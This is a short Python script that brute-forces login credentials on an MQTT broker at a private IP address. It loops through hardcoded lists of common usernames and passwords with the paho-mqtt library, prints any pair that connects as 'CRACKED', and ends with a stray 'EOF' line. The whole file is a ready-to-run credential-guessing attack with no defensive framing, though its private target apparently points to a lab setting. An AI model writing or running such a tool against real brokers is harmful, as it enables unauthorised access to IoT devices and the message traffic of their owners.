import paho.mqtt.client as mqtt
import time

BROKER = "192.168.35.143"
PORT = 1883

userlist = ["admin", "root", "user", "legituser", "test"]
passlist = ["admin", "1234", "password", "test123", "password123", "secret"]

def try_connect(username, password):
    result = {"success": False}
    
    def on_connect(client, userdata, flags, rc):
        if rc == 0:
            result["success"] = True
        
    client = mqtt.Client()
    client.username_pw_set(username, password)
    client.on_connect = on_connect
    try:
        client.connect(BROKER, PORT, 10)
        client.loop_start()
        time.sleep(1)
        client.loop_stop()
        client.disconnect()
    except:
        pass
    return result["success"]

print(f"[*] Starting brute-force against {BROKER}:{PORT}")
for username in userlist:
    for password in passlist:
        success = try_connect(username, password)
        if success:
            print(f"[+] CRACKED! Username: {username} Password: {password}")
        else:
            print(f"[-] Failed: {username}:{password}")

print("[*] Brute-force complete")
EOF